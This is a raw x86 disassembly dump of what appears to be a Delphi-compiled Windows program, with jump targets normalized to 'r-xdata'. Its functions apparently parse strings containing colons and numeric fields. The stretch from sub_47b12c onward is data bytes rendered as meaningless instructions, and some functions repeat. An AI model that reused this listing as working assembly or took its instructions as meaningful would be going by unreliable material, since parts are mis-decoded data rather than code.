mov edx [ ebp + 0xc ]
and eax 0xffff
xor edx edx
test edx edx
je r-xdata
dec edx
je r-xdata
pop ebp
retn 0x8
call sub_403e2c
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
and eax 0xffffff
xor edx edx
test edx edx
je r-xdata
dec edx
jne r-xdata
call sub_403e2c
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
and eax 0xff
xor edx edx
test edx edx
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
xor edx edx
test edx edx
je r-xdata
call sub_403e2c
call sub_403e2c
sub_47a6d0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x10 ] ecx
mov esi edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_47a85d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov [ eax ] 0x1
mov ebx 0x4
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_404edc
xor esi esi
mov eax [ ebp - 0x10 ]
mov [ eax ] 0x0
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov edi 0x1
shl esi 0x8
cmp ebx 0x1
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_463e04
test al al
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx 0x7fffffff
mov edx 0x3
mov eax [ ebp - 0x4 ]
call sub_405384
mov eax [ ebp - 0x18 ]
call sub_463dbc
test al al
je r-xdata
mov edi ebx
mov ecx ebx
add ecx ecx
add ecx ecx
add ecx ecx
shl esi cl
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a864
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_404e68
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
mov eax 0x1
mov edx [ ebp - 0x4 ]
dec eax
test edx edx
je r-xdata
push 0x0
push 0x0
mov edx [ ebp - 0x4 ]
mov eax [ r-xdata ]
call sub_4627e8
push edx
push eax
mov edx edi
mov eax [ ebp - 0xc ]
call sub_47a660
add esi eax
jmp r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov ecx 0x2
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_405384
mov eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_405270
jne r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
dec ebx
jmp r-xdata
inc eax
cmp [ edx + eax - 0x1 ] 0x30
jne r-xdata
push 0x1
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
mov cl 0x1
mov edx r-xdata
call sub_463adc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x0
mov edx [ ebp - 0x4 ]
mov eax [ r-xdata ]
call sub_4627e8
push edx
push eax
mov edx edi
mov eax [ ebp - 0xc ]
call sub_47a660
add esi eax
mov eax [ ebp - 0x4 ]
call sub_463d54
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_47a4cc
push edx
push eax
mov edx edi
mov eax [ ebp - 0xc ]
call sub_47a660
add esi eax
jmp r-xdata
sub_47a888
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_47a92c
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_47a9dc
cmp [ ebp - 0x4 ] 0x0
sete [ esi ]
cmp [ esi ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a933
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_404e68
retn
mov esi 0x8
mov ebx [ ebp + 0x8 ]
mov [ ebx ] ax
add ebx 0x2
dec esi
jne r-xdata
call sub_403e2c
push 0x1
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_463adc
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405170
mov edx [ ebp - 0x8 ]
xor ecx ecx
mov eax [ r-xdata ]
call sub_462668
cmp eax 0xffff
jbe r-xdata
sub_47a954
push ebx
push esi
push edi
add esp 0xffffffe8
mov ebx edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_47a58c
mov [ esp ] eax
lea eax [ esp + 0x8 ]
push eax
lea ecx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov edx ebx
call sub_47a888
mov eax [ esp ]
lea esi [ esp + 0x8 ]
lea edi [ eax + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ esp ]
mov [ eax + 0x18 ] 0x1
lea ecx [ esp + 0x4 ]
mov eax [ esp ]
mov eax [ eax ]
mov edx ebx
call sub_47a6d0
mov edx [ esp ]
mov [ edx + 0x4 ] eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ esp ]
mov [ eax + 0x18 ] 0x0
jmp r-xdata
mov edx esp
mov eax [ r-xdata ]
call sub_462560
jmp r-xdata
mov eax [ esp ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_47a9dc
push ebp
mov ebp esp
push ecx
mov ecx 0x10
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
xor eax eax
push ebp
push sub_47afc9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404e44
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404edc
mov eax [ ebp - 0x4 ]
call sub_405120
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47afd0
lea eax [ ebp - 0x84 ]
mov edx 0x11
call sub_404e68
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov eax 0x1
mov edx [ ebp - 0x4 ]
dec eax
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
inc eax
cmp [ edx + eax - 0x1 ] 0x3a
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_405120
mov edx [ ebp - 0x4 ]
dec eax
test edx edx
je r-xdata
lea eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
call sub_405170
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
inc eax
cmp [ edx + eax - 0x1 ] 0x3a
jne r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_405120
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40512c
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
mov [ ebp - 0x14 ] eax
mov esi 0x1
cmp [ ebp - 0x8 ] 0x3
jne r-xdata
sub eax 0x3
jne r-xdata
call sub_403e2c
cmp esi [ eax - 0x4 ]
jb r-xdata
mov eax [ ebp - 0xc ]
add eax 0xfffffffe
sub eax 0x6
jae r-xdata
mov eax [ ebp - 0xc ]
add eax 0xfffffffe
sub eax 0x5
jae r-xdata
inc esi
movzx eax [ eax + esi - 0x1 ]
cmp eax 0x3a
jg r-xdata
lea eax [ ebp - 0x48 ]
push eax
mov ecx [ ebp - 0x34 ]
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_405384
mov ecx [ ebp - 0x48 ]
lea eax [ ebp - 0x44 ]
mov edx r-xdata
call sub_405170
mov edx [ ebp - 0x44 ]
or ecx 0xffffffff
mov eax [ r-xdata ]
call sub_462668
mov edi eax
test edi edi
jl r-xdata
mov eax [ ebp - 0xc ]
dec eax
cmp eax 0x7
jbe r-xdata
add eax 0xffffffbf
sub eax 0x6
jb r-xdata
je r-xdata
cmp edi 0xffff
jg r-xdata
inc eax
mov eax [ ebp + eax * 4 - 0x38 ]
cmp eax [ ebp - 0x40 ]
jg r-xdata
call sub_403e2c
cmp [ ebp - 0x8 ] 0x0
jg r-xdata
add eax 0xffffffe6
sub eax 0x6
jb r-xdata
inc [ ebp - 0xc ]
cmp [ ebp - 0xc ] 0x8
jge r-xdata
sub eax 0x2e
je r-xdata
lea eax [ ebp - 0x4c ]
push eax
mov ecx 0x1
mov edx edi
mov eax [ r-xdata ]
call sub_46257c
mov edx [ ebp - 0x4c ]
mov eax ebx
mov ecx r-xdata
call sub_405170
mov [ ebp - 0xd ] 0x0
mov eax [ ebp - 0xc ]
sub eax 0x2
jl r-xdata
jmp r-xdata
inc esi
dec [ ebp - 0x14 ]
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
dec eax
cmp eax 0x7
jbe r-xdata
inc [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0x4
jge r-xdata
add eax 0xfffffffe
sub eax 0xa
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x14 ] eax
mov esi 0x2
mov eax [ ebp - 0x4 ]
dec esi
test eax eax
je r-xdata
inc eax
mov [ ebp + eax * 4 - 0x38 ] esi
jmp r-xdata
call sub_403e2c
mov eax [ ebp - 0x8 ]
dec eax
cmp eax 0x2
jbe r-xdata
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebp - 0xc ]
dec eax
cmp eax 0x7
jbe r-xdata
inc eax
mov edi [ ebp + eax * 4 - 0x38 ]
dec esi
cmp esi 0x7
jbe r-xdata
call sub_403e2c
inc eax
mov [ ebp + eax * 4 - 0x44 ] esi
jmp r-xdata
call sub_403e2c
mov eax [ ebx ]
call sub_405120
mov edx eax
dec edx
mov eax ebx
call sub_4055ac
lea eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0xc ]
dec eax
cmp eax 0x7
jbe r-xdata
inc eax
mov edx [ ebp + eax * 4 - 0x38 ]
inc edx
mov ecx 0x7fffffff
mov eax [ ebp - 0x4 ]
call sub_405384
mov ecx [ ebp - 0x60 ]
lea eax [ ebp - 0x5c ]
mov edx r-xdata
call sub_405170
mov edx [ ebp - 0x5c ]
or ecx 0xffffffff
mov eax [ r-xdata ]
call sub_462668
mov edi eax
test edi edi
jl r-xdata
call sub_403e2c
inc esi
mov eax [ ebp + esi * 4 - 0x38 ]
dec eax
cmp edi eax
jne r-xdata
call sub_403e2c
inc eax
mov esi [ ebp + eax * 4 - 0x38 ]
mov ecx [ ebp - 0x40 ]
sub ecx esi
dec ecx
mov eax [ ebp - 0xc ]
dec eax
cmp eax 0x7
jbe r-xdata
call sub_403e2c
mov eax ebx
call sub_404e44
jmp r-xdata
cmp edi 0xffff
jle r-xdata
lea eax [ ebp - 0x54 ]
push eax
dec esi
cmp esi 0x7
jbe r-xdata
cmp [ ebp - 0xd ] 0x0
je r-xdata
inc eax
mov edx esi
inc edx
mov eax [ ebp - 0x4 ]
call sub_405384
mov edx [ ebp - 0x68 ]
or ecx 0xffffffff
mov eax [ r-xdata ]
call sub_462668
mov edi eax
test edi edi
jl r-xdata
call sub_403e2c
push [ ebx ]
lea eax [ ebp - 0x64 ]
push eax
mov ecx 0x1
mov edx edi
mov eax [ r-xdata ]
call sub_46257c
push [ ebp - 0x64 ]
push r-xdata
mov eax ebx
mov edx 0x3
call sub_4051e4
inc esi
mov ecx [ ebp + esi * 4 - 0x38 ]
mov eax esi
dec eax
dec eax
cmp eax 0x7
jbe r-xdata
call sub_403e2c
mov [ ebp - 0xd ] 0x1
mov eax 0x8
sub eax [ ebp - 0xc ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
mov eax ebx
call sub_404e44
jmp r-xdata
mov eax ebx
call sub_404e44
jmp r-xdata
cmp edi 0xff
jle r-xdata
inc eax
sub ecx edi
dec ecx
mov eax esi
dec eax
dec eax
cmp eax 0x7
jbe r-xdata
call sub_403e2c
mov edi eax
test edi edi
jle r-xdata
sub eax 0x2
lea eax [ ebp - 0x6c ]
push eax
mov ecx 0x2
mov edx edi
mov eax [ r-xdata ]
call sub_46257c
mov edx [ ebp - 0x6c ]
mov eax ebx
call sub_40512c
lea eax [ ebp - 0x70 ]
push eax
mov ecx [ ebp - 0x3c ]
mov esi [ ebp - 0x40 ]
sub ecx esi
dec ecx
mov edx esi
inc edx
mov eax [ ebp - 0x4 ]
call sub_405384
mov edx [ ebp - 0x70 ]
or ecx 0xffffffff
mov eax [ r-xdata ]
call sub_462668
mov edi eax
test edi edi
jl r-xdata
inc eax
mov edx edi
inc edx
mov eax [ ebp - 0x4 ]
call sub_405384
mov ecx [ ebp - 0x54 ]
lea eax [ ebp - 0x50 ]
mov edx r-xdata
call sub_405170
mov edx [ ebp - 0x50 ]
or ecx 0xffffffff
mov eax [ r-xdata ]
call sub_462668
mov edi eax
test edi edi
jl r-xdata
call sub_403e2c
inc esi
dec [ ebp - 0x14 ]
jne r-xdata
mov eax ebx
mov edx r-xdata
call sub_40512c
dec edi
jne r-xdata
mov eax ebx
call sub_404e44
jmp r-xdata
cmp edi 0xff
jle r-xdata
mov eax ebx
call sub_404e44
jmp r-xdata
cmp edi 0xffff
jle r-xdata
mov eax esi
dec eax
dec eax
cmp eax 0x7
jbe r-xdata
jmp r-xdata
push [ ebx ]
lea eax [ ebp - 0x74 ]
push eax
mov ecx 0x2
mov edx edi
mov eax [ r-xdata ]
call sub_46257c
push [ ebp - 0x74 ]
push r-xdata
mov eax ebx
mov edx 0x3
call sub_4051e4
lea eax [ ebp - 0x78 ]
push eax
mov ecx [ ebp - 0x38 ]
mov esi [ ebp - 0x3c ]
sub ecx esi
dec ecx
mov edx esi
inc edx
mov eax [ ebp - 0x4 ]
call sub_405384
mov edx [ ebp - 0x78 ]
or ecx 0xffffffff
mov eax [ r-xdata ]
call sub_462668
mov edi eax
test edi edi
jl r-xdata
push [ ebx ]
lea eax [ ebp - 0x58 ]
push eax
mov ecx 0x1
mov edx edi
mov eax [ r-xdata ]
call sub_46257c
push [ ebp - 0x58 ]
push r-xdata
mov eax ebx
mov edx 0x3
call sub_4051e4
mov eax ebx
call sub_404e44
jmp r-xdata
cmp edi 0xff
jle r-xdata
lea eax [ ebp - 0x7c ]
push eax
mov ecx 0x2
mov edx edi
mov eax [ r-xdata ]
call sub_46257c
mov edx [ ebp - 0x7c ]
mov eax ebx
call sub_40512c
lea eax [ ebp - 0x80 ]
push eax
mov edx [ ebp - 0x38 ]
inc edx
mov ecx 0x3
mov eax [ ebp - 0x4 ]
call sub_405384
mov edx [ ebp - 0x80 ]
or ecx 0xffffffff
mov eax [ r-xdata ]
call sub_462668
mov edi eax
test edi edi
jl r-xdata
mov eax ebx
call sub_404e44
jmp r-xdata
cmp edi 0xff
jle r-xdata
push [ ebx ]
lea eax [ ebp - 0x84 ]
push eax
mov ecx 0x2
mov edx edi
mov eax [ r-xdata ]
call sub_46257c
push [ ebp - 0x84 ]
push r-xdata
mov eax ebx
mov edx 0x3
call sub_4051e4
sub_47b12c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
mov cl 0x47
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
mov cl 0x47
add [ eax + 0x34000000 ] ch
nop
inc edi
add al ch
loope r-xdata
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
add [ eax + 0x24004041 ] bh
fild [ ecx ]
rol [ ecx + 0x40 ] 0x0
mov ah 0x41
inc eax
add ah bh
inc eax
add [ eax ] bl
aas
inc eax
add [ ebx ] ah
inc edi
add [ eax ] ch
mov bl 0x47
add ah ch
fld [ ecx ]
enter 0x416d 0x0
jae r-xdata
add [ eax + 0x50 ] dh
inc esi
add al ah
rol [ edi ] 0xc
inc edi
inc edi
add [ edi + eax * 2 + 0x48140047 ] bl
je r-xdata
outsb
outsw
lea eax [ eax ]
in al dx
mov cl 0x47
add [ edi ] al
or al 0x54
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
dec ecx
outsb
outsw
je r-xdata
inc edi
add al dl
rol [ edi ] 0xc
xchg ebx eax
inc edi
add [ eax + 0x40047c1 ] ah
fiadd [ edi ]
cwde
fld [ edi ]
and cl ah
inc edi
add [ eax - 0x1e ] dh
inc edi
add [ eax - 0x34 ] ah
inc edi
add [ esp + ecx * 8 + 0x540c0047 ] dl
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
dec ecx
inc edi
inc edi
add [ eax + ecx * 2 ] dl
inc edi
add [ eax ] ah
xchg ecx eax
inc edi
add [ ebx ] cl
add [ edi ] al
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
or [ eax ] al
shl [ eax + 0xa00047 ] 0x1
add bh bh
mov al [ 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
push cs
inc ecx
jne r-xdata
outsd
jb r-xdata
outsb
je r-xdata
xchg esp eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push 0x69746e65
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430c000a ] al
push 0x656e6961
push eax
jb r-xdata
pop es
add [ ecx ] cl
dec ecx
push eax
push esi
jb r-xdata
cmp [ eax ] bh
inc esi
add [ eax + eax + 0x94ff00 ] dl
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
arpl [ ecx + 0x74 ] sp
imul ebp [ edi + 0x6e ] r-xdata
mov [ eax ] al
add bh bh
mov [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
add al 0x48
outsd
jae r-xdata
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
imul ebp [ edi + 0x6e ] r-xdata
cwde
add [ eax ] al
[ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x55080008 ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] al
or [ ebp + 0x73 ] dl
jb r-xdata
mov al 0x10
inc eax
add [ eax + eax + 0x8cff00 ] cl
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x61500800
jae r-xdata
push ebp
push sub_47b626
push [ fs : eax ]
mov [ fs : eax ] esp
js r-xdata
mov edx esi
mov eax ebx
call sub_479164
pop esi
mov edx esi
mov eax ebx
call sub_479164
mov eax esi
jb r-xdata
movzx edx [ ebx + 0xa0 ]
mov [ eax + 0xa0 ] dl
movzx edx [ ebx + 0xa1 ]
mov [ eax + 0xa1 ] dl
pop esi
pop ebx
retn
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
pop es
push esi
jb r-xdata
ja r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
xor ecx ecx
mov edx [ ebp - 0xc ]
call sub_46f6f8
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404edc
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_478edc
xor eax eax
push ebp
push sub_47b586
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov al 0x4
call sub_4648b0
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
lea edx [ ebp - 0x14 ]
movzx eax [ ebp + 0x8 ]
call sub_4648b0
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ rw-data ]
mov eax [ eax ]
movzx edx [ ebp + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
lea edx [ ebp - 0x18 ]
mov eax ebx
call sub_464878
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
cmp [ esi + 0xa1 ] 0x2
jne r-xdata
push ebx
push esi
mov esi edx
pop ebx
retn
imul ebp [ edi + 0x6e ] r-xdata
pushfd
add [ eax ] al
push [ eax ]
xchg ebx eax
inc edi
jmp [ ecx + 0x1ff0000 ]
jb r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xb8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea ecx [ ebp - 0x44 ]
mov dl 0x1
mov eax [ ebp - 0xc ]
call sub_4646f0
mov edx [ ebp - 0x44 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
lea edx [ ebp - 0x48 ]
xor eax eax
call sub_4648b0
mov edx [ ebp - 0x48 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
push 0x1
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_463adc
mov edx [ ebp - 0x20 ]
mov eax [ r-xdata ]
call sub_462614
lea edx [ ebp - 0x1c ]
call sub_4648b0
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
push 0x1
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_463adc
mov edx [ ebp - 0x28 ]
mov eax [ r-xdata ]
call sub_462614
lea edx [ ebp - 0x24 ]
call sub_4648b0
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
push 0x1
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_463adc
mov edx [ ebp - 0x30 ]
mov eax [ r-xdata ]
call sub_462614
lea edx [ ebp - 0x2c ]
call sub_4648b0
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
push 0x1
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_463adc
mov edx [ ebp - 0x38 ]
mov eax [ r-xdata ]
call sub_462614
lea edx [ ebp - 0x34 ]
call sub_4648b0
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
lea ecx [ ebp - 0x3c ]
mov eax [ esi + 0x98 ]
mov dl 0x1
call sub_4646f0
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
lea edx [ ebp - 0x40 ]
xor eax eax
call sub_4648b0
mov edx [ ebp - 0x40 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
cmp [ esi + 0xa1 ] 0x2
jne r-xdata
insd
xor [ gs : eax + 0xa10047 ] 0x0
cmp al 0x10
inc eax
add [ eax - 0x6f010000 ] dl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ eax ] 0x4
add [ eax ] al
push es
add [ eax + edx * 2 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b62d
lea eax [ ebp - 0x48 ]
mov edx [ r-xdata ]
mov ecx 0x4
call sub_405af0
lea eax [ ebp - 0x38 ]
call sub_404e44
lea eax [ ebp - 0x34 ]
mov edx [ r-xdata ]
call sub_406410
lea eax [ ebp - 0x30 ]
call sub_404e44
lea eax [ ebp - 0x2c ]
mov edx [ r-xdata ]
call sub_406410
lea eax [ ebp - 0x28 ]
call sub_404e44
lea eax [ ebp - 0x24 ]
mov edx [ r-xdata ]
call sub_406410
lea eax [ ebp - 0x20 ]
call sub_404e44
lea eax [ ebp - 0x1c ]
mov edx [ r-xdata ]
mov ecx 0x4
call sub_405af0
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_47b374
push ebp
mov ebp esp
push ecx
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov esi eax
xor eax eax
push ebp
push sub_47b626
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_478edc
xor eax eax
push ebp
push sub_47b586
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov al 0x4
call sub_4648b0
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
lea edx [ ebp - 0x14 ]
movzx eax [ ebp + 0x8 ]
call sub_4648b0
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ rw-data ]
mov eax [ eax ]
movzx edx [ ebp + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
lea edx [ ebp - 0x18 ]
mov eax ebx
call sub_464878
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
cmp [ esi + 0xa1 ] 0x2
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
xor ecx ecx
mov edx [ ebp - 0xc ]
call sub_46f6f8
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404edc
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xb8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea ecx [ ebp - 0x44 ]
mov dl 0x1
mov eax [ ebp - 0xc ]
call sub_4646f0
mov edx [ ebp - 0x44 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
lea edx [ ebp - 0x48 ]
xor eax eax
call sub_4648b0
mov edx [ ebp - 0x48 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
push 0x1
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_463adc
mov edx [ ebp - 0x20 ]
mov eax [ r-xdata ]
call sub_462614
lea edx [ ebp - 0x1c ]
call sub_4648b0
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
push 0x1
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_463adc
mov edx [ ebp - 0x28 ]
mov eax [ r-xdata ]
call sub_462614
lea edx [ ebp - 0x24 ]
call sub_4648b0
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
push 0x1
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_463adc
mov edx [ ebp - 0x30 ]
mov eax [ r-xdata ]
call sub_462614
lea edx [ ebp - 0x2c ]
call sub_4648b0
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
push 0x1
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_463adc
mov edx [ ebp - 0x38 ]
mov eax [ r-xdata ]
call sub_462614
lea edx [ ebp - 0x34 ]
call sub_4648b0
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
lea ecx [ ebp - 0x3c ]
mov eax [ esi + 0x98 ]
mov dl 0x1
call sub_4646f0
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
lea edx [ ebp - 0x40 ]
xor eax eax
call sub_4648b0
mov edx [ ebp - 0x40 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
cmp [ esi + 0xa1 ] 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b62d
lea eax [ ebp - 0x48 ]
mov edx [ r-xdata ]
mov ecx 0x4
call sub_405af0
lea eax [ ebp - 0x38 ]
call sub_404e44
lea eax [ ebp - 0x34 ]
mov edx [ r-xdata ]
call sub_406410
lea eax [ ebp - 0x30 ]
call sub_404e44
lea eax [ ebp - 0x2c ]
mov edx [ r-xdata ]
call sub_406410
lea eax [ ebp - 0x28 ]
call sub_404e44
lea eax [ ebp - 0x24 ]
mov edx [ r-xdata ]
call sub_406410
lea eax [ ebp - 0x20 ]
call sub_404e44
lea eax [ ebp - 0x1c ]
mov edx [ r-xdata ]
mov ecx 0x4
call sub_405af0
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_47b654
push ebp
mov ebp esp
push 0x0
